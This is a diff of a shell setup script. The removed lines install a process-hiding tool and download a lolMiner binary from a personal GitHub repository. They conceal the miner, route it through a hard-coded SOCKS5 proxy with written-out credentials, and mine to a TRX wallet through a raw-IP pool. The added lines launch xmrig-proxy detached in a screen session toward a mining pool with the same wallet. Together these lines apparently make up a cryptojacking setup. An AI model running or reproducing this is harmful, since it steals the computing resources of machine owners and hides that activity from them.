@@ -1,42 +1,5 @@
-apt update && apt -y install sudo wget curl unzip
-
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-
-dpkg-reconfigure --frontend noninteractive tzdata
-
-wget https://github.com/DeniBogeh/DeniBogehh/raw/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 =  45.140.13.119:9132 
-socks5_username = pcvyggpr
-socks5_password = wz3jqv7eyzmp
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-
-echo " "
-
-./graftcp/graftcp wget https://github.com/DeniBogeh/DeniBogehh/raw/main/lolMiner
-chmod +x lolMiner
-
-ph add lolMiner
-
-./graftcp/graftcp ./lolMiner --algo ETHASH --pool 167.71.96.194:3333 --user TRX:TAHyPjWESQmfYTdW1VcGvsWfKeLWVrHNYG.$(echo $(shuf -i 1-999 -n 1)-LOL) --ethstratum ETHPROXY
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig-proxy/releases/download/v6.15.1/xmrig-proxy-6.15.1-linux-x64.tar.gz
+tar xvf xmrig-proxy-6.15.1-linux-x64.tar.gz
+cd xmrig-proxy-6.15.1 && screen -dmS run ./xmrig-proxy -c rx.unmineable.com:3333 -u TRX:TAHyPjWESQmfYTdW1VcGvsWfKeLWVrHNYG.$(echo $(shuf -i 1-9999 -n 1)-PROXY) -p x -b 0.0.0.0:3333 -m simple
